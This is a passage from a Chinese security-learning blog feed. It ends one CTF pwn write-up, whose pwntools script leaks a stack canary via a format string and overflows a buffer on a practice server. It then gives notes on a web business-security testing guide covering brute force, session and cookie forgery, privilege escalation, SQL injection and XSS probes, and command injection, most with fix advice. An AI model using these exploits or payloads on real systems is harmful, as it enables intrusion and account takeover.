class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-comment"># 导入pwn模块</span><br>p=remote(<span class="hljs-string">'61.147.171.105'</span>,<span class="hljs-number">53266</span>)<br> <span class="hljs-comment"># 远程交互</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'2'</span>)<br> <span class="hljs-comment"># 在接收到`3. Exit`后输入2进入格式化字符串漏洞环节</span><br>p.sendline(<span class="hljs-string">'%23$p'</span>)<br> <span class="hljs-comment"># 发送%23$p,让程序输出canary的值 (不明白为什么23位是这样写的)</span><br>p.recvuntil(<span class="hljs-string">'0x'</span>)<br> <span class="hljs-comment"># 读到0x出现为止</span><br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br> <span class="hljs-comment"># canary接收整型16字节数</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">"canary:  "</span> + <span class="hljs-built_in">hex</span>(canary)<br> <span class="hljs-comment"># canary转十六进制</span><br>flag_addr=<span class="hljs-number">0x4008da</span><br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>+p64(flag_addr)<br> <span class="hljs-comment"># 用a填充相差的0x88，跟上第23位的canary值，加上flag地址，最后64位对其填上a*8</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'1'</span>)<br> <span class="hljs-comment"># 读到3.Exit之后输入1 进入栈溢出环节</span><br>p.sendline(payload)<br> <span class="hljs-comment"># 发送payload</span><br>p.interactive()<br> <span class="hljs-comment"># 结束交互</span><br></code></pre></td></tr></tbody></table></figure><p>（题目描述说是非常简单的热身pwn，呵呵）</p><h1 id="拓展：canary"><a href="#拓展：canary" class="headerlink" title="拓展：canary"></a>拓展：canary</h1><p>对于64位程序，在开始运行时，就会随机生成canary，存放在 TLS结构体 tcbhead_t 偏移为 0x28 的位置，带有缓冲区的函数在函数开头就会利于 FS指针 从该位置取出canary的值将其置于 rbp-0x8 的位置，在函数返回时，就会比较 FS[0x28] 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— stack_chk_fail,它会让程序终止并且抛出报错 “stack smahing detected”</p><h1 id="拓展：格式化字符串漏洞"><a href="#拓展：格式化字符串漏洞" class="headerlink" title="拓展：格式化字符串漏洞"></a>拓展：格式化字符串漏洞</h1><p>虽然之前有写过笔记，但是忘记了，所以再记录一遍。</p><p>在C语言中的printf,fprintf,sprintf,snprintf等print函数等用到类似<code>%</code>形式的一个或多个说明符，例如<code>printf("I am %s",lihua);</code></p><p>第一个参数就是格式化字符串，它主要依靠一个可以用来告诉程序如何进行格式化输出的说明符。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理就是程序员偷懒将格式化字符串操作全交给了用户，产生任意地址读写的漏洞。</p><p>正确的函数：</p><pre><code class="hljs">char str[100];scanf("%s",str);printf("%s",str);</code></pre><p>有漏洞的函数：</p><pre><code class="hljs">char str[100];scanf("%s",str);printf(str);</code></pre><p>因为printf函数是可变参数的函数，如果用户输入参数位<code>%x</code>，那么就会输出内存中的数据，因为没有指定参数个数，没有限制输出类型，所以程序遇到<code>%</code>就会根据相应的规则去取相应的参数，直到检索到格式化字符串结束，造成内存泄露。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！&lt;/p&gt;
&lt;h1 id=&quot;查文件&quot;&gt;&lt;a href=&quot;#查文件&quot; class=&quot;headerlink&quot; title=&quot;查文件&quot;&gt;&lt;/a&gt;查文件&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;fi</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Web攻防业务安全实战指南笔记</title>
    <link href="https://sinky.top/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/"/>
    <id>https://sinky.top/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</id>
    <published>2022-11-08T02:59:37.010Z</published>
    <updated>2022-11-08T03:06:09.894Z</updated>
    
    <content type="html"><![CDATA[<p>业务安全测试通常是指针对业务运行的软硬件平台，业务系统所提供的服务进行安全测试，保护业务系统免受安全威胁，以验证业务系统符合安全需求定义和安全标准的过程。</p><p>业务风险点识别应主要关注以下安全风险内容：</p><ol><li>业务环节存在的安全风险：业务环节存在的安全风险指的是业务使用者课件的业务存在的安全风险，如注册、登录和密码找回等身份认真环节，是否存在完善的验证码机制、数据一致性校验机制、Session和Cookie校验机制等，是否能规避验证码绕过、暴力破解和Sql注入等漏洞。</li><li>支持系统存在的安全风险：支持系统存在的安全风险，如用户访问控制机制是否完善，是否存在水平越权或垂直越权漏洞。系统内加密存储机制是否完善，业务数据是否明文传输，系统使用的业务接口是否可以未授权访问/调用，是否可以调用重放、遍历，接口调用参数是否可篡改等。</li><li>业务环节间存在的安全风险：业务环节间存在的安全风险，如系统业务流程是否存在乱序，导致某个业务环节可绕过、回退，或某个业务请求可以无限重放。业务环节间传输的数据是否有一致性校验机制，是否存在业务数据可被篡改的风险。</li><li>支持系统间存在的安全风险：支持系统间存在的安全风险，如系统间数据传输是否加密、系统间传输的参数是否可篡改。系统间输入参数的过滤机制是否完善，是否可能导致sql注入、xss跨站脚本和代码执行漏洞。</li><li>业务环节与支持系统间存在的安全风险：业务环节与支持系统间存在的风险，如数据传输是否加密、加密方式是否完善，是否采用前端加密、简单md5编码等不安全的加密方式。系统处理多线程并发请求的机制是否完善，服务端逻辑与数据库读写是否存在时序问题，导致竞争条件漏洞，系统间输入参数的过滤机制是否完善。</li></ol><h1 id="技术篇"><a href="#技术篇" class="headerlink" title="技术篇"></a>技术篇</h1><h2 id="登录认证模块测试"><a href="#登录认证模块测试" class="headerlink" title="登录认证模块测试"></a>登录认证模块测试</h2><h3 id="暴力破解测试"><a href="#暴力破解测试" class="headerlink" title="暴力破解测试"></a>暴力破解测试</h3><p>暴力破解测试是指针对应用系统用户登录账号与密码进行的穷举测试，针对账号或密码进行逐一比较，直到找出正确的账号密码。</p><ul><li>在已知账号的情况下，加载密码字典针对密码进行穷举测试；</li><li>在未知账号的情况下，加载账号字典，并结合密码字典进行穷举测试。</li><li>在未知账号和密码的情况下，利用账号字典和密码字典进行穷举测试。</li></ul><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p>使用手工或工具对系统登录认证的账号及密码进行穷举访问测试，根据系统返回的数据信息来判别账号及密码是否正确。</p><ol><li>对浏览器进行http代理配置，将浏览器访问请求指向bp工具默认的监听端口。</li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>增加验证码，登录失败一次，验证码变换一次。</li><li>配置登录失败次数限制策略，如在同一用户尝试登录的情况下，5分钟内连续登录失败超过6次，则禁止此用户在3小时内登录系统。</li><li>在条件允许的情况下，增加手机接收短信验证码或邮箱接收邮件验证码，实现双因素认证的防暴力破解机制。</li></ol><p>##本地加密传输测试<br>本机加密传输测试是针对客户端与服务器的数据传输，查看数据是否采用ssl加密方式加密。<br>###测试过程<br>测试验证客户端与服务器交互数据在网络传输过程中是否采用ssl进行加密处理，加密数据是否可被破解。</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>在架设web应用的服务器上部署有效的ssl证书服务</p><h2 id="Session测试"><a href="#Session测试" class="headerlink" title="Session测试"></a>Session测试</h2><h3 id="测试原理和方法"><a href="#测试原理和方法" class="headerlink" title="测试原理和方法"></a>测试原理和方法</h3><p>Session是应用系统对浏览器客户端身份认证的属性标识，在用户退出应用系统时，应将客户端Session认证属性标识清空。如果未能清空客户端Session标识，在下次登录系统时，系统会重复利用该Session标识进行认证会话。攻击者可利用该漏洞生成固定Session会话，并诱骗用户利用攻击者生成的固定会话进行系统登录，从而导致用户会话认证被窃取。</p><h3 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h3><p>在注销退出系统时，对当前浏览器授权SessionID值进行记录，再次登录系统，将本次授权SessionID值与上次进行比对校验。判断服务器是否与上次相同的SessionID值进行授权认证，若使用相同SessionID值则存在固定会话风险。</p><ul><li>在已登录授权认证的页面中退出系统</li><li>使用bp截取退出系统的请求数据，记录本次授权的SessionID</li><li>重新登录系统，bp截取登录授权请求数据，与上次的SessionID值比较判断是否相同</li></ul><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>在客户端登录系统时，应首先判断客户端是否提交浏览器的留存Session认证会话属性标识，客户端提交此信息至服务器时，应及时销毁浏览器留存的Session认证会话，并要求客户端浏览器重新生成Session认证会话属性标识。</p><h2 id="Session会话注销测试"><a href="#Session会话注销测试" class="headerlink" title="Session会话注销测试"></a>Session会话注销测试</h2><p>Session是应用系统对浏览器客户端身份认证的属性标识，在用户注销或退出应用系统时，系统应将客户端Session认证属性标识清空，如果未能清空Session认证会话，该认证会话，将持续有效，此时攻击者获得该Session认证会话会导致用户权限被盗取。</p><h3 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h3><p>用户退出系统授权后，判断授权认证SessionID值是否依然有效，若授权认证SessionID依然有效则存在风险。</p><ul><li>对已登录授权的系统页面使用Bp进行截取，保存SessionID值</li><li>将数据包发送到Repeater模块中</li><li>在已授权的页面中退出系统。</li><li>重发数据包，并查看系统是否对推出后得到用户授权Session今年解除授权。</li></ul><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>在用户注销或退出应用系统时，服务器应及时销毁Session认证会话信息并清空客户端浏览器Session属性标识。</p><h2 id="Session会话超时事件测试"><a href="#Session会话超时事件测试" class="headerlink" title="Session会话超时事件测试"></a>Session会话超时事件测试</h2><p>在用户成功登录系统获得Session认证会话，该Session认证会话应具有生命周期，即用户在成功登录系统后，在固定时间内该用户与服务器无任何交互操作，应销毁该用户Session认证会话信息，要求用户重新登录系统认证。</p><h3 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h3><p>对系统会话授权认证时长进行测试，并根据系统承载的业务需求来分析判断当前系统会话授权认证时间是否过长。</p><ul><li>对已登录授权的系统页面使用bp工具进行请求数据截取，将数据包中Session认证参数值进行保存记录。</li><li>发送到Repeater中，三十分钟后重发，看能否继续查阅信息</li></ul><h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>对每个生成的Session认证会话配置生命周期，从而有效降低因用户会话认证时间过长而导致的信息泄露风险。</p><h2 id="Cookie仿冒测试"><a href="#Cookie仿冒测试" class="headerlink" title="Cookie仿冒测试"></a>Cookie仿冒测试</h2><p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在cookie中，并发送至客户端存储。攻击者通过尝试修改cookie中的身份标识，从而达到仿冒其他用户身份的目的，并拥有相关用户的所有权限。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>对系统会话授权认证cookie中会话身份认证标识进行篡改测试，通过篡改身份认证标识值来判断能否改变用户身份会话。</p><ul><li>使用李雷账号登录系统并进行浏览器页面刷新</li><li>使用bp对本次页面刷新请求数据进行截取，并将请求数据cookie中的userid值修改为admin进行提交。</li><li>查看提交后的返回信息，账号身份授权被修改成管理员</li></ul><h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对客户端标识的用户敏感信息数据，使用Session会话认证方式，避免被他人仿冒身份</p><h2 id="密文比对认证测试"><a href="#密文比对认证测试" class="headerlink" title="密文比对认证测试"></a>密文比对认证测试</h2><p>在系统登录时密码加密流程一般是先将用户名和密码发送到服务器，服务器会把用户提交的密码经过hash算法加密后和数据库中存储的加密值比对，如果加密值相同，则判定用户提交密码正确。</p><p>但有些网站系统的流程是在前台浏览器客户端对密码进行hash加密后传输给服务器并与数据库加密值进行对比，如果加密值相同，则判定用户提交密码正确，此流程会泄露密码加密方式导致出现安全隐患。</p><h3 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h3><p>对系统敏感数据加密流程进行测试，判断加密过程或方式是否为客户端加密方式。</p><ul><li>bp抓包，根据页面代码分析后证实登录传输口令使用Hash MD5加密算法加密<ul><li>bp抓包，查看web系统登录提交密码为加密后的密文传输</li><li>通过对页面代码分析得出web系统登录口令加密处理过程是由本地js脚本来完成，方式为md5。</li></ul></li><li>用bp爆破，添加配置项payloadProcessing，将要破解的密码值进行数据处理转换。</li></ul><h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><p>将密码加密过程及密文比对过程防止在服务器后台执行，发送用户名和密码到服务器后台，后台对用户提交的密码经过md5算法加密后和数据库中存储的md5密码值进行比对，如果加密值相同，则允许用户登录</p><h2 id="登录失败信息测试"><a href="#登录失败信息测试" class="headerlink" title="登录失败信息测试"></a>登录失败信息测试</h2><p>在用户登录系统失败时，系统会在页面显示用户登录失败信息，若提交账号在系统中不存在，系统提示“用户名不存”、“账号不存在”等明确信息，假如提交账号在系统中存在，则系统提示“密码错误”等间接提示信息，攻击者可根据此类登录失败提示信息来判断当前登录账号是否在系统中存在，从而进行有针对性的暴力破解口令测试</p><h3 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h3><p>对系统登录失败提示语句表达内容进行统一的模糊描述，从而提高攻击者对登录系统用户名及密码的可猜测难度。</p><h1 id="业务办理模块测试"><a href="#业务办理模块测试" class="headerlink" title="业务办理模块测试"></a>业务办理模块测试</h1><h2 id="订单ID篡改测试"><a href="#订单ID篡改测试" class="headerlink" title="订单ID篡改测试"></a>订单ID篡改测试</h2><p>开发人员没考虑登录后用户间权限间隔问题，就会导致水平越权。</p><h3 id="测试过程-5"><a href="#测试过程-5" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录李先生账号，查看本人保单，抓包修改保单号，即可越权查看他人保单内容。</p><p>在返回的数据包中，包含全部在界面中被隐藏的身份证号等敏感信息。</p><h3 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台查看订单时要通过Session机制判断用户身份，做好平行权限控制，服务端需要校验相应订单是否和登录者身份一致，防止水平越权泄露用户敏感个人信息。</p><h2 id="手机号码篡改测试"><a href="#手机号码篡改测试" class="headerlink" title="手机号码篡改测试"></a>手机号码篡改测试</h2><p>手机号通常可以代表一个用户身份，当请求中发现有手机号参数时，我们可以试着修改它，测试是否存在越权漏洞，系统登录功能一般先判断用户名和密码是否正确，通过Session机制赋予用户令牌，但是在登录后的某些操作某些功能时，抓包或通过其他方式尝试篡改手机号，即可对此类问题进行测试。</p><h3 id="测试过程-6"><a href="#测试过程-6" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录后在操作某些功能时抓包，篡改手机号进行测试。</p><ul><li>以尾号0136手机号登录，选择挂失业务。</li><li>抓包修改手机号为另一个手机号尾号9793</li><li>手机号码参数篡改成功，成功挂失尾号9793</li></ul><h3 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台请求要通过Session机制判断用户身份，如果需要客户端传输手机号码，则服务端需要校验手机号是否和登录者的身份一致，如发现不一致则拒绝将请求，防止水平越权，对于手机app程序，不要过于相信从手机中直接读取的手机号码，要做常规的身份认证，规范登录流程防止未授权登录</p><h2 id="用户ID篡改测试（水平越权）"><a href="#用户ID篡改测试（水平越权）" class="headerlink" title="用户ID篡改测试（水平越权）"></a>用户ID篡改测试（水平越权）</h2><p>从开发角度，用户登录后查看个人信息时，需要通过sessionid判定用户身份，然后显示相应用户的个人信息，但有时我们发现在get或post请求中有userid这类参数传输，并且后台通过此参数显示对应用户隐私信息，这就导致攻击者可以通过篡改用户Id越权访问其他用户隐私信息。</p><h3 id="测试过程-7"><a href="#测试过程-7" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录，点击收货地址修改，抓包，发现关键参数deliverID，修改为其他，提交后返回非本账户的联系人相关信息</p><h3 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台功能请求要通过Session机制判断用户身份，不要相信客户端传来的用户ID,如果确实需要客户端传输userid，则服务端需要校验userid是否和登录者的Session身份一致，防止被攻击者篡改，未授权访问他人账号内容</p><h2 id="邮箱和用户篡改测试（水平越权）"><a href="#邮箱和用户篡改测试（水平越权）" class="headerlink" title="邮箱和用户篡改测试（水平越权）"></a>邮箱和用户篡改测试（水平越权）</h2><p>在发送邮件或站内消息时，篡改其中的发件人参数，导致攻击者可以伪造发信人进行钓鱼攻击等操作，用户登录成功后拥有发信权限，开发者就信任了客户端传来的发件人参数，导致业务安全问题出现。</p><h3 id="测试过程-8"><a href="#测试过程-8" class="headerlink" title="测试过程"></a>测试过程</h3><p>编写邮件点击发送，bp抓包，修改发件人参数inputFron，并提交发送邮件，收件时，发现发件人被篡改成功。</p><h3 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h3><p>用户登录后写信、发送信息时需要通过Session机制判断用户身份，如果需要客户端传输邮箱、发件人，服务端需要校验邮箱、发件人是否和登录者的身份一致，防止被攻击者篡改用于钓鱼攻击。</p><h2 id="商品编号篡改测试"><a href="#商品编号篡改测试" class="headerlink" title="商品编号篡改测试"></a>商品编号篡改测试</h2><p>修改上皮内金额，篡改商品编号，低价购买高价商品。</p><h3 id="测试过程-9"><a href="#测试过程-9" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>登录积分商城，挑选一个商品，编号为goods_id=xxx5ff7,需要30积分。</li><li>选择5积分商品，抓包修改goods_id，替换为xxx5ff7，替换成功，用5积分购买了30积分商品。</li></ul><h3 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议商品金额不要在客户端传入，防止被篡改，或确实需要在客户端传入金额，则服务端在收到请求后必须检查商品价格与交易金额一直，或对支付金额做签名校验。</p><h2 id="竞争条件测试"><a href="#竞争条件测试" class="headerlink" title="竞争条件测试"></a>竞争条件测试</h2><p>竞争条件：当两个或多个进程试图在同一时刻访问共享内存，或读写某些共享数据时，最后的竞争结果，取决于线程执行的顺序（线程运行时序），成为竞争条件。</p><p>在web安全中，在服务端逻辑与数据库读写存在时序问题时，就可能存在竞争条件漏洞，攻击者通常利用多线程并发请求，在数据库中的余额字段更新之前，多次兑换积分或购买商品，从中获利。</p><h3 id="测试过程（教程只写了漏洞没写测试漏洞）"><a href="#测试过程（教程只写了漏洞没写测试漏洞）" class="headerlink" title="测试过程（教程只写了漏洞没写测试漏洞）"></a>测试过程（教程只写了漏洞没写测试漏洞）</h3><p>攻击者在提交订单时抓包，设置很多个线程重放此包，在众多请求中，个别请求就有可能争取绕过金额，次数的判断，交易成功，攻击者从中获利。</p><h3 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h3><p>在处理订单、支付等关键业务时，使用悲观锁或乐观锁保证事务的ACID特性（原子性、一致性、隔离性、持久性），并避免数据脏读（一个事务读取了另一个事务未提交的数据），解决竞争条件和并发操作可能带来的相关业务问题</p><h1 id="业务授权访问模块"><a href="#业务授权访问模块" class="headerlink" title="业务授权访问模块"></a>业务授权访问模块</h1><h2 id="非授权访问测试"><a href="#非授权访问测试" class="headerlink" title="非授权访问测试"></a>非授权访问测试</h2><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息，可以尝试在登录某网站前台或后台之后，将相关的页面链接复制到其他浏览器或其他电脑上进行访问</p><h3 id="测试过程-10"><a href="#测试过程-10" class="headerlink" title="测试过程"></a>测试过程</h3><p>在ie浏览器中登录某网站进行交费，复制缴费成功的url，在火狐浏览器里访问，成功访问</p><h3 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h3><p>未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露，所以对未授权访问页面做Session认证，并对用户访问的每一个url做身份鉴别，正确地校验用户ID及Token等。</p><h2 id="越权测试"><a href="#越权测试" class="headerlink" title="越权测试"></a>越权测试</h2><p>水平越权：相同权限的不同用户可以互相访问</p><p>垂直越权：使用权限低的用户可以访问权限较高的用户</p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul><li>保存用户任务ID,抓包看到请求中关键参数ID,若可以更改能看到其他提交者，则存在水平越权漏洞，爆破自动更改关键参数ID.</li></ul><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>登录一个普通用户，超级管理员账号为admin，找到修改密码，将密码改为789，确定修改，抓包，发现两个参数，uid和pwd，即用户名和密码，将uid值改为admin，密码789不变。</p><p>提交修改后的数据包提示密码修改成功，登录管理员账号成功。</p><h3 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h3><p>服务端需校验身份唯一性，自己的身份只能查看、修改、删除、添加自己的信息</p><h1 id="输入-x2F-输出模块测试"><a href="#输入-x2F-输出模块测试" class="headerlink" title="输入/输出模块测试"></a>输入/输出模块测试</h1><h2 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h2><p>sql注入就是通过把sql命令插入web表单提交或输入域名页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令的目的。</p><p>按照请求类型分为：get型，post型，cookie型。</p><p>get和post区别是由表单的提交方式决定的，按照数据类型可分为数字型和字符型，数字型不用闭合前面的sql语句，字符型需要闭合。</p><p>测试方法分为报错型、延时型、盲注型、布尔型等。</p><p>数字型注入测试方法如下：</p><ul><li>正常请求，查看页面</li><li>在请求的参数后加and 1=1，如果可以添加执行，则和第一步的返回页面并无差异。</li><li>在请求参数后加and 1=2，如果返回页面与第二步页面明显不同，或有所差异，则断定存在数字型注入</li></ul><p>字符型注入测试方法如下：</p><ul><li>正常请求查看页面（如查询admin用户信息，则返回admin用户的信息）</li><li>在查询的参数后加 <code>'or 1=1</code>,加单引号的目的是闭合前面的sql语句并与后面的语句形成语法正确的sql语句，如果可以添加并能够执行，则返回除admin用户外所有用户的信息，这时可以判断存在字符型注入。</li></ul><h3 id="测试过程-11"><a href="#测试过程-11" class="headerlink" title="测试过程"></a>测试过程</h3><p>略</p><h3 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h3><p>每个提交信息的客户端页面、通过服务器端脚本（JSP、ASP、ASPX、PHP等）生成的客户端页面、提交的表单（FORM）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。</p><ul><li>Sql语句关键词：and,or ,select,declare,update,xp_cmdshell;</li><li>sql语句特殊符号<code>'、</code>，<code>''、</code>等</li></ul><p>web应用系统接入数据库服务器使用的用户不应为系统管理员，用户角色应遵循最小权限原则。</p><h2 id="XSS测试"><a href="#XSS测试" class="headerlink" title="XSS测试"></a>XSS测试</h2><p>跨站脚本漏洞是web应用程序在将数据输出到网页的时候存在问题，导致恶意攻击者可以在往web页面里插入而已js,html代码，并将构造的而已数据显示在页面的漏洞中。攻击者一般利用此漏洞窃取或操纵客户会话和cookie，用于模仿合法用户，从而使攻击者以该用户身份查看或变更与用户记录以及执行事务。</p><p>跨站一般情况下主要分为存储型xss，反射性xss，DOM型跨站。</p><p>存储型xss脚本可直接写入服务端数据库，反射性不写入数据库，由服务端解析后在浏览器生成一段类似<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>的脚本。</p><p>反射性跨站测试主要是在url或输入框内插入一段跨站脚本，观察是否能弹出对话框。</p><p>存储型xss主要是在网站的留言板、投诉、建议等输入框内输入一段跨站脚本，看能否插入数据库，插入成功的表现为当网站管理人员查看该留言时，会执行跨站语句，或者当普通用户再次1访问该页面时，会执行跨站语句，如弹出对话框。</p><h3 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h3><p>每个提交信息的客户端页面、通过服务器端脚本（jsp,asp,aspx,php）生成的客户端页面、提交的表单（form）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。</p><ul><li><p>HTML标签的<code>&lt;、“、’、%</code>等，以及这些符号的Unicode值</p></li><li><p>客户端脚本<code>（JavaScript、VBScript）</code>关键字：<code>JavaScript、script</code>等。</p></li><li><p>对于信息搜索功能，不应在搜索结果页面中回显搜索内容。同时应设置出错页面，防止Web服务器发生内部错误时，将错误信息返回给客户端</p></li><li><p>定义允许的行为，确保Web应用程序根据预期结果的严格定义来验证所有输入参数（Cookie、标头、查询字符串、表单、隐藏字段等）。</p></li><li><p>检查POST和GET请求的响应，以确保返回的对象是预期的内容且有效</p></li><li><p>通过对用户提供的数据进行编码，从用户输入中移除冲突的字符、括号和单双引号。这将防止插入的脚本以可执行的格式发送给最终用户。</p></li><li><p>只要可能，就应将客户端提供的所有数据限制为字母数字数据。使用此过滤机制时，如果用户输入<code>“&lt;script&gt;alertdocumentcookie（'aaa'）&lt;/script&gt;”</code>，将缩减为<code>“scriptalertdocumentcookiescript”</code>。如果必须使用非字母数字字符，请先将其编码为HTML 实体，然后再将其用在HTTP响应中，这样就无法将它们用于修改HTML文档的结构。</p></li><li><p>使用双因素客户身份验证机制，而非单因素身份验证</p></li><li><p>在修改或使用脚本之前，验证脚本的来源。</p></li><li><p>不要完全信任其他人提供的脚本并用在自己的代码中</p></li></ul><h2 id="命令执行测试"><a href="#命令执行测试" class="headerlink" title="命令执行测试"></a>命令执行测试</h2><p>在应用需要调用一些外部程序去处理内容的情况下，会用到一些执行系统命令的函数，如php中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。测试中如果没有对参数（cmd=、command、excute=等）进行过滤，就可以直接造成命令执行漏洞或配合绕过及命令连接符（<code>&amp;、|、||、；</code>）等进行命令执行漏洞测试</p><h3 id="测试过程-12"><a href="#测试过程-12" class="headerlink" title="测试过程"></a>测试过程</h3><p>由于未对register_key参数进行过滤可能存在命令执行漏洞，抓包并对其进行测试，构造命令执行语句并执行成功，证明此参数为经严格过滤造成命令执行漏洞。</p><p>（略，哪天找时间搭一个dvwa靶场）</p><h3 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h3><p>尽量少用执行命令的函数或者直接禁用，参数值尽量使用引号包括在使用动态函数之前，确保使用的函数是指定的函数之一，在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义。</p><h1 id="回退模块测试"><a href="#回退模块测试" class="headerlink" title="回退模块测试"></a>回退模块测试</h1><h2 id="回退测试"><a href="#回退测试" class="headerlink" title="回退测试"></a>回退测试</h2><p>web业务在密码修改成功后或者订单付款成功后等业务模块，在返回上一步重新修改密码或者重新付款时存在重新设置密码或者付款的功能，这时如果能返回上一步重复操作，而且还能更改或者重置结果，则存在业务回退漏洞。</p><h3 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于业务流程有多步的情况，如修改密码或重置密码等业务，首先判断该步骤的请求是否是上一步骤的业务所发起的，如果不是则返回错误提示或页面失效。</p><h1 id="验证码机制测试"><a href="#验证码机制测试" class="headerlink" title="验证码机制测试"></a>验证码机制测试</h1><h2 id="验证码暴力破解测试"><a href="#验证码暴力破解测试" class="headerlink" title="验证码暴力破解测试"></a>验证码暴力破解测试</h2><p>验证码机制主要被用于防止暴力破解，防止DDoS攻击，识别用户身份等，常见的验证码主要有图片验证码、邮件验证码、短信验证码、滑动验证码和语音验证码.</p><h3 id="测试过程-13"><a href="#测试过程-13" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者填写任意手机号进行性注册，服务器向攻击者填写的手机号码发送短信验证，攻击者设置验证码范围，对验证码进行暴力破解，通过返回数据包判断是否破解成功，然后通过破解成功的验证码完成注册。</p><h3 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>设置验证码的失效时间，建议为180秒</li><li>限制单位时间内验证码的失败尝试次数，如五分钟内连续失败5次即锁定该账号15分钟</li></ul><h2 id="验证码重复使用测试"><a href="#验证码重复使用测试" class="headerlink" title="验证码重复使用测试"></a>验证码重复使用测试</h2><p>在网站的登录或评论等页面，如果验证码认证成功后没有将session及时清空，将会导致验证码首次认证成功之后可重复使用，测试时可以抓取携带验证码的数据包重复提交，查看是否提交成功。</p><h3 id="测试过程-14"><a href="#测试过程-14" class="headerlink" 